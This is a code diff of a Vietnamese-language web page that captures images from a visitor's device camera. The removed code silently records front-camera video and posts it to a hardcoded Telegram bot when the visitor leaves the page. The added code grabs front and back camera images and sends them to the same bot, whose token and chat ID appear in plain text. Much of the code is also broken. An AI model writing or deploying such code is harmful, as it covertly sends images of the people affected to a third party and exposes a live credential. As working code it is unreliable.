@@ -2,41 +2,51 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Tạo video</title>
+  <title>Chụp ảnh và gửi lên Telegram</title>
 </head>
 <body>
-  <h1>Tạo video</h1>
-  <button id="start-button">Bắt đầu</button>
-  <video id="video" width="640" height="480" autoplay></video>
+  <h1>Chụp ảnh và gửi lên Telegram</h1>
+  <button id="take-photo">Chụp ảnh</button>
 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
   <script>
-    const video = document.getElementById("video");
-    const startButton = document.getElementById("start-button");
+    $(document).ready(function() {
+      // Hàm chụp ảnh
+      function takePhoto() {
+        // Lấy ảnh camera trước
+        const photoFront = document.createElement("img");
+        photoFront.src = URL.createObjectURL(navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: "user"
+          }
+        }));
 
-    startButton.addEventListener("click", () => {
-      video.srcObject = navigator.mediaDevices.getUserMedia({
-        video: {
-          facingMode: "user",
-        },
-      });
+        // Lấy ảnh camera sau
+        const photoBack = document.createElement("img");
+        photoBack.src = URL.createObjectURL(navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: "environment"
+          }
+        }));
 
-      // Bắt đầu quay video
-      video.play();
-    });
+        // Gửi ảnh lên Telegram
+        $.ajax({
+          url: "https://api.telegram.org/bot6630148049:AAG1xYKPmQvG1EaUCb8_JygwwwF-F2dkNQ0/sendPhoto",
+          data: {
+            "chat_id": -1002081721946,
+            "photo": [
+              photoFront.src,
+              photoBack.src
+            ]
+          },
+          type: "POST"
+        }).done(function() {
+          console.log("Ảnh đã được gửi lên Telegram");
+        });
+      }
 
-    // Khi người dùng đóng trang web
-    window.addEventListener("beforeunload", () => {
-      // Lấy video đã quay
-      const blob = await video.captureStream().toBlob();
-
-      // Gửi video lên bot Telegram
-      fetch("https://api.telegram.org/bot6630148049:AAG1xYKPmQvG1EaUCb8_JygwwwF-F2dkNQ0/sendDocument", {
-        method: "POST",
-        body: blob,
-        header: {
-          "Content-Type": "application/octet-stream",
-        },
-      });
+      // Thêm sự kiện click cho nút chụp ảnh
+      document.getElementById("take-photo").addEventListener("click", takePhoto);
     });
   </script>
 </body>
